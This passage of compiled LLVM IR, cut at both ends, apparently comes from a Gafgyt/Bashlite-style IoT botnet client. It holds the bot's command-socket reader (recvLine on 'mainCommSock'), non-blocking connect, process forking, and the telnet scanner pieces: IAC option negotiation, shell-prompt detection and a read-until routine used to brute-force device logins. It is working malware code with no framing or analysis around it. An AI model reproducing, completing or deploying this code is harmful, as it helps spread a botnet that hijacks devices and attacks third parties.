  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #14
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #14
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #14
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %5) #3
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #3
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #17
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !2
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #14
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext29 = shl i64 %1, 32
  %5 = ashr exact i64 %sext29, 32
  %6 = getelementptr inbounds i8, i8* %0, i64 %5
  %sext41 = shl i64 %1, 32
  %7 = ashr exact i64 %sext41, 32
  %8 = icmp sgt i32 %2, 0
  br i1 %8, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %9 = icmp sgt i32 %2, %.1.lcssa
  br i1 %9, label %.lr.ph.preheader.1, label %.critedge.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %14, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %10 = sub nsw i64 0, %indvars.iv
  %11 = getelementptr inbounds i8, i8* %6, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = trunc i64 %indvars.iv to i32
  switch i8 %12, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %14 = add nsw i32 %.130, 1
  %15 = icmp sgt i64 %7, %indvars.iv.next
  br i1 %15, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %13, %.lr.ph ], [ %14, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %16 = sext i32 %.1.lcssa to i64
  %17 = sub nsw i64 0, %16
  %18 = getelementptr inbounds i8, i8* %4, i64 %17
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %19, 58
  br i1 %20, label %21, label %.preheader.137

; <label>:21:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.preheader.1:                               ; preds = %.preheader.137
  %22 = sext i32 %.1.lcssa to i64
  br label %.lr.ph.1

.lr.ph.1:                                         ; preds = %.critedge1.1, %.lr.ph.preheader.1
  %indvars.iv.1 = phi i64 [ %22, %.lr.ph.preheader.1 ], [ %indvars.iv.next.1, %.critedge1.1 ]
  %.130.1 = phi i32 [ %.1.lcssa, %.lr.ph.preheader.1 ], [ %27, %.critedge1.1 ]
  %23 = sub nsw i64 0, %indvars.iv.1
  %24 = getelementptr inbounds i8, i8* %6, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = trunc i64 %indvars.iv.1 to i32
  switch i8 %25, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %27 = add nsw i32 %.130.1, 1
  %28 = icmp sgt i64 %7, %indvars.iv.next.1
  br i1 %28, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %26, %.lr.ph.1 ], [ %27, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %29 = sext i32 %.1.lcssa.1 to i64
  %30 = sub nsw i64 0, %29
  %31 = getelementptr inbounds i8, i8* %4, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 62
  br i1 %33, label %21, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %34 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %34, label %.lr.ph.preheader.2, label %.critedge.2

.lr.ph.preheader.2:                               ; preds = %.preheader.238
  %35 = sext i32 %.1.lcssa.1 to i64
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.critedge1.2, %.lr.ph.preheader.2
  %indvars.iv.2 = phi i64 [ %35, %.lr.ph.preheader.2 ], [ %indvars.iv.next.2, %.critedge1.2 ]
  %.130.2 = phi i32 [ %.1.lcssa.1, %.lr.ph.preheader.2 ], [ %40, %.critedge1.2 ]
  %36 = sub nsw i64 0, %indvars.iv.2
  %37 = getelementptr inbounds i8, i8* %6, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = trunc i64 %indvars.iv.2 to i32
  switch i8 %38, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %40 = add nsw i32 %.130.2, 1
  %41 = icmp sgt i64 %7, %indvars.iv.next.2
  br i1 %41, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %39, %.lr.ph.2 ], [ %40, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %42 = sext i32 %.1.lcssa.2 to i64
  %43 = sub nsw i64 0, %42
  %44 = getelementptr inbounds i8, i8* %4, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = icmp eq i8 %45, 37
  br i1 %46, label %21, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %47 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %47, label %.lr.ph.preheader.3, label %.critedge.3

.lr.ph.preheader.3:                               ; preds = %.preheader.339
  %48 = sext i32 %.1.lcssa.2 to i64
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.critedge1.3, %.lr.ph.preheader.3
  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
